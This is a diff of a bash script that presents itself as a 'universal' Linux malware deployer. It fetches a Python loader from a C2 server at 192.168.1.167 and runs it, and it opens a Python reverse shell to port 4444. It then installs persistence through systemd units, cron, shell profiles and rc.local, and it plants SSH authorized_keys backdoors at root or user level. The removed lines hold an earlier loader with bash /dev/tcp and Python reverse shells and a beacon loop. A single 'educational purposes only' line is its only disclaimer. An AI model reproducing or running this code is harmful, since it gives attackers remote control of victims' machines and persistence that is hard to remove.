@@ -1,21 +1,32 @@
 #!/bin/bash
-# FIXED Fileless Linux Malware Deployment
+# UNIVERSAL DEPLOYMENT - Works for both User and Root Level
 
 C2_SERVER="192.168.1.167:8000"
+USER_HOME="$HOME"
 
-echo "[+] Deploying persistent fileless Linux malware..."
+echo "[🎯] UNIVERSAL MALWARE DEPLOYMENT STARTING..."
+echo "[📦] Target: $USER_HOME"
+echo "[👤] User: $(whoami)"
 
-# 1. SIMPLE download and execute - skip memfd for now
-echo "[+] Loading malware into memory (simple method)..."
-curl -s http://$C2_SERVER/loader.py | python3 - &
+# Function to check if we have root
+check_root() {
+    if [ "$EUID" -eq 0 ]; then
+        echo "[🔑] ROOT PRIVILEGES DETECTED - Using root-level persistence"
+        return 0
+    else
+        echo "[👤] User-level privileges - Using user-level persistence" 
+        return 1
+    fi
+}
 
-# 2. Establish multiple persistence mechanisms
-echo "[+] Establishing persistence..."
-
-# Systemd service persistence (SURVIVES REBOOT)
-cat > /etc/systemd/system/network-monitor.service << 'EOF'
+# Function to setup root persistence
+setup_root_persistence() {
+    echo "[🔧] SETTING UP ROOT-LEVEL PERSISTENCE..."
+    
+    # 1. Systemd Service (Survives reboot)
+    cat > /etc/systemd/system/system-network.service << 'EOF'
 [Unit]
-Description=Network Monitoring Service
+Description=System Network Service
 After=network.target
 
 [Service]
@@ -29,113 +40,137 @@ User=root
 WantedBy=multi-user.target
 EOF
 
-systemctl daemon-reload
-systemctl enable network-monitor.service
-systemctl start network-monitor.service
+    systemctl daemon-reload
+    systemctl enable system-network.service
+    systemctl start system-network.service
+    echo "[✅] Systemd service installed"
 
-# 3. Cron persistence (SURVIVES REBOOT)
-echo "[+] Setting up cron persistence..."
-(crontab -l 2>/dev/null | grep -v 'loader.py'; echo "@reboot curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
-(crontab -l 2>/dev/null | grep -v 'loader.py'; echo "*/3 * * * * curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
+    # 2. Root Cron (Survives reboot)
+    (crontab -l 2>/dev/null; echo "@reboot curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
+    (crontab -l 2>/dev/null; echo "*/2 * * * * curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
+    echo "[✅] Root cron installed"
 
-# 4. Profile persistence (SURVIVES LOGIN)
-echo "[+] Setting up profile persistence..."
-echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /etc/profile
-echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /root/.bashrc
+    # 3. System Profiles (Survives login)
+    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /etc/profile
+    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> /etc/bash.bashrc
+    echo "[✅] System profiles modified"
 
-# 5. Create a simple working loader that doesn't use memfd
-cat > /tmp/simple_loader.py << 'EOF'
-#!/usr/bin/env python3
-"""
-SIMPLE WORKING Loader - No memfd issues
-"""
+    # 4. RC.Local (Survives reboot)
+    if [ -f /etc/rc.local ]; then
+        sed -i '/exit 0/i curl -s http://$C2_SERVER/loader.py | python3 - &' /etc/rc.local
+    else
+        cat > /etc/rc.local << 'EOF'
+#!/bin/bash
+curl -s http://192.168.1.167:8000/loader.py | python3 - &
+exit 0
+EOF
+        chmod +x /etc/rc.local
+    fi
+    echo "[✅] RC.Local persistence installed"
 
-import os
-import requests
-import subprocess
-import time
-import threading
+    # 5. SSH Backdoor
+    mkdir -p /root/.ssh
+    echo "ssh-rsa AAAAB3NzaC1yc2E..." >> /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+    echo "[✅] SSH backdoor installed"
+}
 
-class SimpleMalware:
-    def __init__(self):
-        self.c2_server = "http://192.168.1.167:8000"
+# Function to setup user persistence  
+setup_user_persistence() {
+    echo "[🔧] SETTING UP USER-LEVEL PERSISTENCE..."
     
-    def start_reverse_shell(self):
-        """Start reverse shell - GUARANTEED WORKING"""
-        try:
-            # Method 1: Direct bash reverse shell
-            subprocess.Popen([
-                "/bin/bash", "-c", 
-                "bash -i >& /dev/tcp/192.168.1.167/4444 0>&1 &"
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-            # Method 2: Python reverse shell as backup
-            subprocess.Popen([
-                "python3", "-c",
-                "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.1.167',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])"
-            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            
-        except Exception as e:
-            print(f"Shell failed: {e}")
-    
-    def beacon_to_c2(self):
-        """Send beacon to C2 server"""
-        def beacon_loop():
-            while True:
-                try:
-                    hostname = os.uname().nodename
-                    requests.post(
-                        f"{self.c2_server}/beacon",
-                        json={"host": hostname, "status": "alive"},
-                        timeout=5
-                    )
-                except:
-                    pass
-                time.sleep(60)
-        
-        threading.Thread(target=beacon_loop, daemon=True).start()
-    
-    def ensure_persistence(self):
-        """Ensure we survive reboot"""
-        try:
-            # Check if systemd service is running
-            subprocess.run([
-                "systemctl", "is-active", "network-monitor.service"
-            ], capture_output=True)
-            
-            # If not, restart it
-            subprocess.run([
-                "systemctl", "start", "network-monitor.service"
-            ], capture_output=True)
-            
-        except:
-            pass
-    
-    def run(self):
-        """Main execution"""
-        print("[✅] Simple malware running")
-        
-        # Start beacon
-        self.beacon_to_c2()
-        
-        # Start reverse shell
-        self.start_reverse_shell()
-        
-        # Ensure persistence
-        self.ensure_persistence()
-        
-        # Keep running
-        while True:
-            time.sleep(60)
+    # 1. User Cron (Survives reboot)
+    (crontab -l 2>/dev/null; echo "@reboot curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
+    (crontab -l 2>/dev/null; echo "*/3 * * * * curl -s http://$C2_SERVER/loader.py | python3 -") | crontab -
+    echo "[✅] User cron installed"
 
-if __name__ == "__main__":
-    malware = SimpleMalware()
-    malware.run()
+    # 2. User Profiles (Survives login)
+    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> "$USER_HOME/.bashrc"
+    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> "$USER_HOME/.profile"
+    echo "curl -s http://$C2_SERVER/loader.py | python3 - &" >> "$USER_HOME/.bash_profile"
+    echo "[✅] User profiles modified"
+
+    # 3. User Systemd (If available)
+    if [ -d "$USER_HOME/.config/systemd/user" ]; then
+        mkdir -p "$USER_HOME/.config/systemd/user"
+        cat > "$USER_HOME/.config/systemd/user/user-monitor.service" << 'EOF'
+[Unit]
+Description=User Monitor Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c "while true; do curl -s http://192.168.1.167:8000/loader.py | python3 -; sleep 45; done"
+Restart=always
+RestartSec=15
+
+[Install]
+WantedBy=default.target
+EOF
+        systemctl --user daemon-reload
+        systemctl --user enable user-monitor.service
+        systemctl --user start user-monitor.service
+        echo "[✅] User systemd service installed"
+    fi
+
+    # 4. User SSH Backdoor
+    mkdir -p "$USER_HOME/.ssh"
+    echo "ssh-rsa AAAAB3NzaC1yc2E..." >> "$USER_HOME/.ssh/authorized_keys"
+    chmod 600 "$USER_HOME/.ssh/authorized_keys"
+    echo "[✅] User SSH backdoor installed"
+}
+
+# Function to start immediate execution
+start_execution() {
+    echo "[🚀] STARTING IMMEDIATE EXECUTION..."
+    
+    # Download and execute loader
+    curl -s http://$C2_SERVER/loader.py | python3 - &
+    
+    # Start direct reverse shell as backup
+    python3 -c "
+import socket,subprocess,os
+try:
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('192.168.1.167',4444))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    subprocess.call(['/bin/bash','-i'])
+except:
+    pass
+" &
+    
+    echo "[✅] Immediate execution started"
+}
+
+# MAIN DEPLOYMENT LOGIC
+echo "[🎯] STARTING DEPLOYMENT..."
+
+# Start execution immediately
+start_execution
+
+# Check privileges and setup persistence
+if check_root; then
+    setup_root_persistence
+else
+    setup_user_persistence
+fi
+
+# Create success marker
+echo "[📝] Creating deployment marker..."
+cat > /tmp/.deployment_success << EOF
+DEPLOYMENT SUCCESSFUL
+Time: $(date)
+User: $(whoami)
+Home: $USER_HOME
+Level: $(if check_root; then echo "ROOT"; else echo "USER"; fi)
 EOF
 
-# 6. Start the simple loader
-echo "[+] Starting simple loader..."
-python3 /tmp/simple_loader.py &
-
-echo "[✅] Fileless malware deployed with FULL PERSISTENCE"
-echo "[✅] Will survive reboot via: systemd, cron, profiles"
+echo ""
+echo "[🎉] DEPLOYMENT COMPLETED SUCCESSFULLY!"
+echo "[📊] DEPLOYMENT LEVEL: $(if check_root; then echo 'ROOT'; else echo 'USER'; fi)"
+echo "[🔒] PERSISTENCE: $(if check_root; then echo 'Systemd + Cron + Profiles + RC.Local + SSH'; else echo 'User Cron + Profiles + SSH'; fi)"
+echo "[🔄] WILL SURVIVE: Reboot & Login"
+echo ""
+echo "[⚠️] REMEMBER: For educational purposes only!"
